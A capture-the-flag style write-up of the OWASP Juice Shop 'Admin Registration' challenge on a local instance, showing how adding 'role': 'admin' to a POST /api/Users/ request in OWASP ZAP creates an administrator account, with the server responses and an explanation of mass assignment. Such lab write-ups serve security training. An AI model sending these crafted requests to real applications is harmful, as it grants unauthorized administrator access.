# OWASP Juice Shop — Admin Registration

## Challenge Objective

> Register as a user with administrator privileges.

Create a new account with administrator privileges.

The solution involved adding `"role": "admin"` to the user registration request. The server accepted the supplied role and created an administrator account.

## Environment and Tools

- Application: OWASP Juice Shop
- Instance URL: `http://localhost:3000`
- Tool: OWASP ZAP — Requester tab
- Endpoint: `POST /api/Users/`
- Data format: JSON
- Header: `Content-Type: application/json`

## Solution Walkthrough

### 1. Inspecting a Standard Registration Request

First, I inspected a request that created a regular user:

```json
{
  "email": "test@test.com",
  "password": "12345",
  "passwordRepeat": "12345",
  "securityQuestion": {
    "id": 1,
    "question": "Your eldest siblings middle name?",
    "createdAt": "2026-10-13T03:52:24.614Z",
    "updatedAt": "2026-10-13T03:52:24.614Z"
  },
  "securityAnswer": "Test"
}
```

The request did not contain a `role` field.

The server responded with `201 Created`. The newly created account contained the following values:

```json
{
  "id": 25,
  "email": "test@test.com",
  "role": "customer"
}
```

The response revealed that the user model includes a `role` field, even though the standard registration form does not submit it.
<img width="1907" height="960" alt="image" src="https://github.com/user-attachments/assets/4e8e37c3-d82b-4560-bce8-87887257637f" />

### 2. Modifying the Request in OWASP ZAP

In the Requester tab, I prepared another request to the same endpoint.

The key modification was adding the following field:

```json
"role": "admin"
```

Request headers — excerpt:

```http
POST /api/Users/ HTTP/1.1
Host: localhost:3000
Content-Type: application/json
```

Request body:

```json
{
  "email": "admin",
  "password": "admin",
  "passwordRepeat": "admin",
  "role": "admin",
  "securityQuestion": {
    "id": 1,
    "question": "Your eldest siblings middle name?",
    "createdAt": "2026-10-13T03:52:24.614Z",
    "updatedAt": "2026-10-13T03:52:24.614Z"
  },
  "securityAnswer": "Admin"
}
```

I then submitted the request using the `Send` button.

> The credentials shown in this example were used exclusively in a local training environment.

### 3. Verifying the Server Response

The server responded with:

```http
HTTP/1.1 201 Created
Location: /api/Users/26
```

JSON response excerpt:

```json
{
  "status": "success",
  "data": {
    "id": 26,
    "email": "admin",
    "role": "admin",
    "isActive": true,
    "profileImage": "/assets/public/images/uploads/defaultAdmin.png"
  }
}
```

The `"role": "admin"` field confirmed that the backend accepted the additional parameter and created an account with the administrator role.
<img width="1908" height="886" alt="image" src="https://github.com/user-attachments/assets/5395caac-d372-40dc-b448-57e7bf3a24e6" />

### 4. Confirming Challenge Completion

Juice Shop displayed the following notification:

```text
You successfully solved a challenge: Admin Registration
(Register as a user with administrator privileges.)
```

This notification confirmed that the challenge was completed.

The screenshots document the creation of an administrator account, but they do not show a separate login or interaction with the administration panel.
<img width="1902" height="853" alt="image" src="https://github.com/user-attachments/assets/9f575eb5-b863-4ffb-96bd-4b6891dc105e" />

## Vulnerability Explanation

The issue corresponds to **mass assignment**: the backend accepts additional client-supplied fields and uses them when creating a user object.

In this case, the client could explicitly set the `role` field, even though the standard registration form did not expose it.

Comparison of the results:

| Scenario | `role` Field in the Request | Role in the Response |
| --- | --- | --- |
| Standard registration | Not included | `customer` |
| Modified registration | `"admin"` | `admin` |

The decisive change was adding `"role": "admin"`, not using the account name `admin` or a particular password.

## Key Takeaways

- A field being absent from a form does not mean the backend will reject it in a manually crafted request.
- API responses can reveal model fields relevant to access control.
- In this test, client-controlled input determined the role assigned to a newly created account.
- Both the API response and the challenge completion notification confirmed the result.
